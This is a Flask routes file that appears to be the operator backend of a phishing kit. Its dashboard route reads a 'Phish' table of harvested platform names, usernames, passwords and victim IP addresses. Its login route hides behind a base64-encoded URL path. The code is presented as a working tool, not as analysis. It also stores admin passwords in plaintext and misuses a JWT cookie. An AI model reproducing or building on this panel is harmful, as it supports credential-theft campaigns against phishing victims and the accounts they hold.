from app import app, db
from flask import request, render_template, jsonify, make_response, redirect, url_for
from flask_jwt_extended import (
    JWTManager, jwt_required, create_access_token, 
    create_refresh_token, get_jwt_identity, set_access_cookies, set_refresh_cookies
)
from app.main.config.models import User, Phish

from base64 import b64encode


@app.route('/dashboard')
@jwt_required
def dashboard():
    current_user = get_jwt_identity()
    
    print('######'+ current_user)
    users = Phish.query.all()
    print(type(users))
    users_formatted = []
    for i in users:
        to_app = f'{i.platform} {i.phised_user} {i.phished_pword} {i.ip}'
        users_formatted.append(to_app)
    return render_template('dashboard.html', amount=len(users))
  
    
@app.route('/bG9naW5fcGFnZQ==',methods=["GET","POST"])
def login():
    if request.method == 'GET':
        return render_template("login.html")
    
    data = request.form.to_dict()
    required_vals = ["username", "password"]
    for i in required_vals:
        if i in data.keys():
            pass
        else:
            return render_template("login.html", error=f"you are missing {i}")
    
    user=User.query.filter_by(username=data["username"]).first()
    if user is None:
        return render_template("login.html", error="user does not exist")
    else:
        if user.password == data["password"]:
            pass
        else:
            return render_template("login.html", error="incorrect password")
    access_token = create_access_token(identity=data["username"])
    refresh_token = create_refresh_token(identity=data["username"])
    resp = make_response(redirect(url_for('dashboard')))
    set_access_cookies(resp, access_token)
    set_refresh_cookies(resp, access_token)
    return resp


